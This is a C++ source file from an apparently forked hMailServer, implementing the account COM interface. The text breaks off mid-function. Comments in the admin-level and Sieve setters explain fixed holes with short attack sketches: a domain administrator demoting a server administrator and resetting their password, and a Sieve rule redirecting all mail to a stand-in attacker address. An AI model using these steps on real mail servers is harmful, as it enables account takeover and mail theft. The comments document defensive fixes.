// Copyright (c) 2010 Martin Knafve / hMailServer.com.  
// https://www.progressiverobot.com
// Copyright (c) 2026 Christopher Holloway / Progressive Robot Ltd
#include "stdafx.h"
#include "InterfaceAccount.h"
#include "InterfaceMessages.h"
#include "InterfaceFetchAccounts.h"
#include "InterfaceAppPasswords.h"
#include "InterfaceRules.h"
#include "InterfaceIMAPFolders.h"

#include "../common/Persistence/PersistentAccount.h"
#include "../common/BO/Accounts.h"
#include "../Common/Util/Math.h"
#include "../Common/Util/PasswordPolicy.h"
#include "../Common/Util/PasswordHistory.h"
#include "../Common/Util/Time.h"
#include "../Common/Util/Totp.h"
#include "../Common/Util/PasswordValidator.h"
#include "../Common/Util/Crypt.h"
#include "../Common/Util/FileUtilities.h"
#include "../Common/BO/IMAPFolder.h"
#include "../Common/BO/IMAPFolders.h"
#include "../Common/BO/Messages.h"
#include "../Common/BO/Message.h"
#include "../common/Persistence/PersistentMessage.h"
#include "../Common/Util/Time.h"
#include "../Common/Cache/AccountSizeCache.h"
#include "../Common/Sieve/SieveStorage.h"

#include "../POP3/POP3Sessions.h"
#include "../IMAP/IMAPFolderUtilities.h"
#include "../IMAP/IMAPFolderContainer.h"

#include "COMAuthentication.h"

#include "COMError.h"

#ifdef _DEBUG
#define DEBUG_NEW new(_NORMAL_BLOCK, __FILE__, __LINE__)
#define new DEBUG_NEW
#endif

using namespace HM;

#ifdef _DEBUG
   long InterfaceAccount::counter = 0;
#endif

STDMETHODIMP InterfaceAccount::InterfaceSupportsErrorInfo(REFIID riid)
{
   static const IID* arr[] = 
   {
      &IID_IInterfaceAccount,
   };

   for (int i=0;i<sizeof(arr)/sizeof(arr[0]);i++)
   {
      if (InlineIsEqualGUID(*arr[i],riid))
         return S_OK;
   }
   return S_FALSE;
}

void
InterfaceAccount::SetAuthentication(std::shared_ptr<HM::COMAuthentication> pAuthentication)
{
   authentication_ = pAuthentication;
}

STDMETHODIMP InterfaceAccount::get_Active(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetActive() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_Active(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetActive(newVal == VARIANT_TRUE);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_ADDomain(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetADDomain().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_ADDomain(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->GetIsDomainAdmin())
         return authentication_->GetAccessDenied();
   
      object_->SetADDomain(newVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_Address(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetAddress().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_Address(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->GetIsDomainAdmin())
         return authentication_->GetAccessDenied();
   
      HM::String sAddress = newVal;
      sAddress.Trim();
   
      object_->SetAddress(sAddress);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_DomainID(long *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = (long) object_->GetDomainID();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_DomainID(LONG newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // Only here for backwards compatibility (4.x)
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_IsAD(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (object_->GetIsAD())
         *pVal = VARIANT_TRUE;
      else
         *pVal = VARIANT_FALSE;
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_IsAD(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->GetIsDomainAdmin())
         return authentication_->GetAccessDenied();
   
      object_->SetIsAD(newVal == VARIANT_TRUE);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_Password(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetPassword().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_TOTPEnabled(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // The secret's presence IS the switch. There is no separate enabled flag,
      // because two sources of truth for "is the second factor on" is how a feature
      // ends up enforced in one place and not another.
      *pVal = object_->GetTotpSecret().IsEmpty() ? VARIANT_FALSE : VARIANT_TRUE;

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::EnrolTOTP(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->GetIsDomainAdmin())
         return authentication_->GetAccessDenied();

      HM::AnsiString secret = HM::Totp::GenerateSecret();

      if (secret.IsEmpty())
         return COMError::GenerateError("The random number generator failed, so no second factor was enrolled. Nothing has been stored. See the hMailServer error log.");

      object_->SetTotpSecret(secret);

      // The URI carries the secret, and this is the only moment it leaves the server:
      // there is no property that reads it back, because the point of a second factor
      // is that possessing the account does not yield it. Whoever enrols has to
      // capture it now - which is exactly what scanning the QR code does.
      *pVal = HM::String(HM::Totp::BuildOtpAuthUri(HM::AnsiString(object_->GetAddress()), secret)).AllocSysString();

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::DisableTOTP()
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->GetIsDomainAdmin())
         return authentication_->GetAccessDenied();

      // App passwords are deliberately left alone. They are separately revocable
      // credentials that were valid before the second factor was enrolled and remain
      // valid after it is removed; silently deleting them here would break every
      // client the account holder had set up, as a side effect of an unrelated
      // administrative action.
      object_->SetTotpSecret("");

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

namespace
{
   // A folder name is IMAP data, not a path: it can contain every character
   // Windows refuses in a directory name. Each is replaced rather than dropped,
   // so two folders differing only in a forbidden character stay distinct.
   HM::String SanitizeFolderNameForExport(const HM::String &name)
   {
      HM::String result = name;

      const TCHAR *forbidden = _T("\\/:*?\"<>|");
      for (const TCHAR *c = forbidden; *c != 0; ++c)
         result.Replace(*c, _T('_'));

      result.Trim();
      if (result.IsEmpty())
         result = _T("_");

      return result;
   }

   // Walks the folder tree depth-first, copying every message file into a
   // directory mirroring the folder structure. Stops on the FIRST failure and
   // says which file, because a partial export that reports success is exactly
   // the wrong artefact to hand to a person exercising a data-access right.
   bool ExportFolderTreeForAccount(std::shared_ptr<HM::Account> account,
                                   std::shared_ptr<HM::IMAPFolders> folders,
                                   const HM::String &directory,
                                   int &exported,
                                   HM::String &error)
   {
      if (!folders)
         return true;

      // No Refresh() here, and the absence is load-bearing: IMAPFolders::Refresh
      // loads the account's ENTIRE tree into whichever collection it is called
      // on - it is the top-level collection's loader, and it populates the
      // sub-folder collections itself as it builds the hierarchy. Calling it on
      // a sub-folder collection turns that collection into a second copy of the
      // whole tree, and this walk into infinite descent. The one Refresh this
      // export needs is done by the caller, on the root, before the walk.

      for (unsigned int i = 0; i < (unsigned int) folders->GetCount(); i++)
      {
         std::shared_ptr<HM::IMAPFolder> folder = folders->GetItem(i);
         if (!folder)
            continue;

         const HM::String folderDirectory = directory + _T("\\") + SanitizeFolderNameForExport(folder->GetFolderName());

         std::shared_ptr<HM::Messages> messages = folder->GetMessages();
         if (messages)
         {
            messages->Refresh(false);

            for (unsigned int j = 0; j < (unsigned int) messages->GetCount(); j++)
            {
               std::shared_ptr<HM::Message> message = messages->GetItem(j);
               if (!message)
                  continue;

               const HM::String source = HM::PersistentMessage::GetFileName(account, message);

               HM::String target;
               target.Format(_T("%s\\%u.eml"), folderDirectory.c_str(), message->GetUID());

               // The copy creates the folder directory on first use, so an
               // empty folder produces no empty directory - the export mirrors
               // the mail, not the folder skeleton.
               if (!HM::FileUtilities::Copy(source, target, true))
               {
                  error.Format(_T("The message file %s could not be copied to %s. The export is incomplete and should be re-run."),
                     source.c_str(), target.c_str());
                  return false;
               }

               exported++;
            }
         }

         if (!ExportFolderTreeForAccount(account, folder->GetSubFolders(), folderDirectory, exported, error))
            return false;
      }

      return true;
   }
}

STDMETHODIMP InterfaceAccount::ExportMessages(BSTR Directory, long *ExportedCount)
{
   try
   {
      if (!ExportedCount)
         return COMError::GenerateGenericMessage();

      *ExportedCount = 0;

      if (!object_)
         return GetAccessDenied();

      // Server admin, not domain admin: this writes to the server's own file
      // system, and where a file may be written is a machine-level trust.
      if (!authentication_->GetIsServerAdmin())
         return authentication_->GetAccessDenied();

      HM::String directory = Directory;
      directory.Trim();

      if (directory.IsEmpty())
         return COMError::GenerateError("A target directory must be given.");

      int exported = 0;
      HM::String error;

      std::shared_ptr<HM::IMAPFolders> rootFolders = object_->GetFolders();
      if (rootFolders)
         rootFolders->Refresh();

      if (!ExportFolderTreeForAccount(object_, rootFolders, directory, exported, error))
         return COMError::GenerateError(error);

      *ExportedCount = exported;

      HM::String logMessage;
      logMessage.Format(_T("Exported %d message(s) for an account on an operator's request."), exported);
      LOG_APPLICATION(logMessage);

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_Password(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // The one place an account password is CHOSEN, so the one place the policy is
      // enforced. Every route here goes through this property - the Control Panel,
      // DBSetup, scripts and the API - and none of the paths that merely verify or
      // re-hash an existing password come near it, which is deliberate: refusing a
      // password that already works would lock people out of mailboxes they can open
      // today, in the name of making them safer.
      //
      // Off by default, so an existing installation sees no change until an
      // administrator configures one.
      HM::String policyFailure;

      if (!HM::PasswordPolicy::IsAcceptable(object_->GetAddress(), newVal, policyFailure))
         return COMError::GenerateError(policyFailure);

      // Reuse is checked against the CURRENT password and the last N, and refuses
      // the change rather than anything else - nobody is ever locked out by this,
      // they are standing there able to pick something different.
      if (HM::PasswordHistory::IsReuse(object_, newVal))
         return COMError::GenerateError("This password has been used recently on this account. Choose one that has not.");

      // Recorded BEFORE the new hash replaces the old one, because the thing being
      // recorded IS the old one.
      HM::PasswordHistory::Record(object_);

      // The password isn't encrypted. Encrypt it now using MD5.
      int preferredHashAlgorithm = HM::IniFileSettings::Instance()->GetPreferredHashAlgorithm();
      String sPassword = HM::Crypt::Instance()->EnCrypt(newVal, (HM::Crypt::EncryptionType) preferredHashAlgorithm);
   
      object_->SetPassword(sPassword);
      object_->SetPasswordEncryption(preferredHashAlgorithm);

      // The age clock starts here, at the one place a password is chosen. Not on
      // the paths that re-hash an existing password to a stronger scheme: an upgrade
      // of the STORAGE is not a change of the SECRET, and treating it as one would
      // quietly reset everybody's expiry the first time they logged in.
      object_->SetPasswordChanged(HM::Time::GetCurrentDateTime());
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_Size(float *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      float fMB = (1024*1024);
   
      __int64 accountSizeBytes = AccountSizeCache::Instance()->GetSize(object_->GetID());
   
      *pVal = HM::Math::Round((float) accountSizeBytes / fMB,3);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::Save()
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // Only server administrators have access to change settings for server administrators.
      // Without this check, a domain administrator could change the settings for a server administrator, such
      // as his password and the log on as server administrator.
      // (This would only be possible if the server admin is added as a user to a domain which the domain admin
      // is domain administrator for).
      if (!authentication_->GetIsServerAdmin())
      {
         if (object_->GetAdminLevel() == HM::Account::ServerAdmin)
         {
            return COMError::GenerateError("You do not have access to save the user account. Server administrator accounts can only be updated by server administrators.");
         }
      }


      String sErrorMessage;
      if (PersistentAccount::SaveObject(object_, sErrorMessage, true, HM::PersistenceModeNormal))
      {
         // Add to parent collection
         AddToParentCollection();
   
         return S_OK;
      }
   
      return COMError::GenerateError("Failed to save object. " +  sErrorMessage);
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::UnlockMailbox()
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      __int64 iAccountID = object_->GetID();
      POP3Sessions::Instance()->Unlock(iAccountID);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::ValidatePassword(BSTR Password, VARIANT_BOOL *pCorrect)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pCorrect = HM::PasswordValidator::ValidatePassword(object_, Password) ? VARIANT_TRUE : VARIANT_FALSE; 
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_ADUsername(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetADUsername().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_ADUsername(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->GetIsDomainAdmin())
         return authentication_->GetAccessDenied();
   
      object_->SetADUsername(newVal);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::DeleteMessages()
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      PersistentAccount::DeleteMessages(object_);
   
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_Messages(IInterfaceMessages **pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      CComObject<InterfaceMessages>* pMessages = new CComObject<InterfaceMessages>();
      pMessages->SetAuthentication(authentication_);
   
      std::shared_ptr<HM::Messages> pMsgs = object_->GetMessages();
   
      if (!pMsgs)
         return DISP_E_BADINDEX;  
   
      pMessages->Attach(pMsgs);
      pMessages->AddRef();
      *pVal = pMessages;
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_MaxSize(long *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetAccountMaxSize();
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_MaxSize(long pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->GetIsDomainAdmin())
         return authentication_->GetAccessDenied();
   
      object_->SetAccountMaxSize(pVal);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationMessageIsOn(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = PersistentAccount::GetIsVacationMessageOn(object_) ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationMessageIsOn(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetVacationMessageIsOn(newVal == VARIANT_TRUE);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationMessage(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

   
      *pVal = object_->GetVacationMessage().AllocSysString();
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationMessage(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetVacationMessage(newVal);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationSubject(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

   
      *pVal = object_->GetVacationSubject().AllocSysString();
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationSubject(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetVacationSubject(newVal);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationMessageExpires(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetVacationExpires() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationMessageExpires(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetVacationExpires(newVal == VARIANT_TRUE);
      return S_OK;   
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationMessageExpiresDate(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetVacationExpiresDate().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationMessageExpiresDate(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      HM::String string = newVal;
      
      // Validate input date.
      if (string.Left(4) == _T("0000"))
         string = "";
   
      if (string.GetLength() == 0)
         string = Time::GetCurrentDate();
      else if (string.GetLength() != 10 || !Time::IsValidSystemDate(string))
         return COMError::GenerateError("Invalid auto-reply expiry date");
   
      object_->SetVacationExpiresDate(string);

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationMessageBeginDate(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetVacationBeginDate().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationMessageBeginDate(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      HM::String string = newVal;

      // The same validation the expiry date gets: an empty or zeroed value means
      // "from today", which is the no-scheduling behaviour every account had
      // before this property existed.
      if (string.Left(4) == _T("0000"))
         string = "";

      if (string.GetLength() == 0)
         string = Time::GetCurrentDate();
      else if (string.GetLength() != 10 || !Time::IsValidSystemDate(string))
         return COMError::GenerateError("Invalid auto-reply begin date");

      object_->SetVacationBeginDate(string);

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationMessageAbortSpamFlagged(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetVacationAbortSpamFlagged() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationMessageAbortSpamFlagged(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetVacationAbortSpamFlagged(newVal == VARIANT_TRUE);
      return S_OK;   
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_AppPasswords(IInterfaceAppPasswords **pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      CComObject<InterfaceAppPasswords>* pItem = new CComObject<InterfaceAppPasswords>();
      pItem->SetAuthentication(authentication_);

      std::shared_ptr<HM::AppPasswords> passwords = std::shared_ptr<HM::AppPasswords>(new HM::AppPasswords());

      passwords->Refresh(object_->GetID());

      pItem->Attach(passwords, object_->GetID());
      pItem->AddRef();
      *pVal = pItem;

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_FetchAccounts(IInterfaceFetchAccounts **pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      CComObject<InterfaceFetchAccounts>* pItem = new CComObject<InterfaceFetchAccounts >();
      pItem->SetAuthentication(authentication_);
   
      std::shared_ptr<HM::FetchAccounts> pFetchAccounts = std::shared_ptr<HM::FetchAccounts>(new HM::FetchAccounts(object_->GetID()));
   
      pFetchAccounts->Refresh();
   
      if (pFetchAccounts)
      {
         pItem->Attach(pFetchAccounts);
         pItem->AddRef();
         *pVal = pItem;
      }
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_AdminLevel(eAdminLevel *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = (eAdminLevel) object_->GetAdminLevel();
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_AdminLevel(eAdminLevel newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // Above the switch, deliberately: this asks about the account being MODIFIED, not
      // about the level being assigned, so it must hold on every path through this
      // function.
      //
      // Save() carries a check for the same thing - "Only server administrators have
      // access to change settings for server administrators" - and its comment describes
      // the attack it was meant to stop: a server admin whose mailbox sits in a domain
      // somebody else administers. But it asks object_->GetAdminLevel(), the IN-MEMORY
      // value this setter has already overwritten, and nothing re-reads the stored one.
      // So the guard was defeated by the property assignment that precedes it:
      //
      //    acct = domain.Accounts.ItemByAddress("boss@corp.com")  // a server admin
      //    acct.AdminLevel = 0        // object_ becomes Normal
      //    acct.Password = "..."
      //    acct.Save()                // guard reads Normal, allows both writes
      //
      // A domain administrator could demote the server administrator and set their
      // password in three lines. Refusing the change here is what makes Save()'s check
      // reachable again: with the level unchanged it still reads ServerAdmin, so the
      // password write is refused too.
      //
      // Putting this inside the Normal/DomainAdmin case - where it first went - was not
      // enough. eAdminLevel is a COM enum, which is to say a long, and neither COM
      // automation nor a vtable call range-checks it. The switch below has no default,
      // so a value matching no case fell straight through to SetAdminLevel() and set the
      // level to something that is neither ServerAdmin nor a valid level at all:
      //
      //    acct.AdminLevel = 3        // matches no case, guard never evaluated
      //    acct.Password = "..."
      //    acct.Save()                // 3 == ServerAdmin(2) is false, both writes allowed
      //
      // which is the same takeover by a different door, and PersistentAccount::SaveObject
      // would have written the 3 to accountadminlevel without validating it either.
      if (object_->GetAdminLevel() == HM::Account::ServerAdmin &&
          !authentication_->GetIsServerAdmin())
         return authentication_->GetAccessDenied();

      // Check that the user has permission to do this change.
      switch (newVal)
      {
      case hAdminLevelNormal:
      case hAdminLevelDomainAdmin:
         {
            // The client wants to give this user normal or domain level
            // rights. This is OK if the user is domain or server admin.
            if (!authentication_->GetIsDomainAdmin() && !authentication_->GetIsServerAdmin())
               return authentication_->GetAccessDenied();

            break;
         }
      case hAdminLevelServerAdmin:
         {
            if (object_->GetAdminLevel() == hAdminLevelServerAdmin)
            {
               // It's OK to set this user to admin since the user already is admin. We
               // don't need to change anything.
               return S_OK;
            }

            if (!authentication_->GetIsServerAdmin())
            {
               // Only server admins are allowed to give other users server admin rights.
               return authentication_->GetAccessDenied();
            }

            break;
         }
      default:
         {
            // Anything else is not an admin level. Refused rather than stored, both
            // because the value would be meaningless in accountadminlevel and because
            // silently accepting it is what let the guard above be walked around.
            return COMError::GenerateError("The specified administration level is not valid.");
         }
      }
   
   
      object_->SetAdminLevel((HM::Account::AdminLevel) newVal);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_Rules(IInterfaceRules **pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      CComObject<InterfaceRules >* pItem = new CComObject<InterfaceRules >();
      pItem->SetAuthentication(authentication_);
   
      std::shared_ptr<HM::Rules> pRules = object_->GetRules();
   
      if (pRules)
      {
         pItem->Attach(pRules);
         pItem->AddRef();
         *pVal = pItem;
      }
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_IMAPFolders(IInterfaceIMAPFolders **pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (object_->GetID() == 0)
         return DISP_E_BADINDEX;  
   
      CComObject<InterfaceIMAPFolders>* pItem = new CComObject<InterfaceIMAPFolders >();
      pItem->SetAuthentication(authentication_);
   
      std::shared_ptr<HM::IMAPFolders> pFolders = HM::IMAPFolderContainer::Instance()->GetFoldersForAccount(object_->GetID());
   
      if (pFolders)
      {
         pItem->Attach(pFolders);
         pItem->AddRef();
         *pVal = pItem;
      }
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP 
InterfaceAccount::get_QuotaUsed(long *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      __int64 accountSizeBytes = AccountSizeCache::Instance()->GetSize(object_->GetID());
   
      __int64 iMaxSize = ((__int64) object_->GetAccountMaxSize()) * 1024; // Convert from MB to KB
      __int64 iCurrentSize = accountSizeBytes / 1024; // Convert from Bytes to KB
   
      int iPercentageUsed = 0;
      
      if (iMaxSize > 0)
         iPercentageUsed = (int) (((float) iCurrentSize/ (float) iMaxSize) * 100);
   
      *pVal = iPercentageUsed;
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_ForwardEnabled(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetForwardEnabled() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_ForwardEnabled(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetForwardEnabled(newVal == VARIANT_TRUE);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_ForwardAddress(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetForwardAddress().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_ForwardAddress(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetForwardAddress(newVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_SieveScript(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // Sieve scripts are stored as files keyed by the account address, so this
      // property reads directly from SieveStorage (no Save() required).
      *pVal = HM::SieveStorage::GetActiveScript(object_->GetAddress()).AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_SieveScript(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // The script is persisted to disk immediately (file-backed, not part of the
      // account row), so this does not require a subsequent Save() - and that is
      // exactly why it needs its own guard.
      //
      // Save() carries the check that stops a domain administrator altering a server
      // administrator's account, for the case its comment describes: a server admin
      // whose mailbox sits inside a domain somebody else administers. Every other
      // sensitive property on this interface is written to object_ and therefore
      // reaches that check. This one goes straight to the filesystem and bypassed it
      // completely.
      //
      // A domain administrator could therefore install
      //
      //    require ["copy"]; redirect :copy "attacker@example.test";
      //
      // on the server administrator's account and receive a copy of all their mail.
      // LocalDelivery reads that file on every delivery, so it takes effect at once,
      // with no save and nothing to review. The same account's password could not be
      // changed - only its mail could be redirected, which is worse.
      if (!authentication_->GetIsServerAdmin())
      {
         if (object_->GetAdminLevel() == HM::Account::ServerAdmin)
            return COMError::GenerateError("You do not have access to change the Sieve script of a server administrator account. Server administrator accounts can only be updated by server administrators.");
      }

      // Reported rather than discarded: SetActiveScript returns whether the file was
      // written, and a disk-full or permission failure otherwise left the caller
      // believing the filter was installed while mail kept being delivered unfiltered.
      if (!HM::SieveStorage::SetActiveScript(object_->GetAddress(), HM::String(newVal)))
         return COMError::GenerateError("The Sieve script could not be written to disk. Check the hMailServer error log.");

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_ForwardKeepOriginal(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

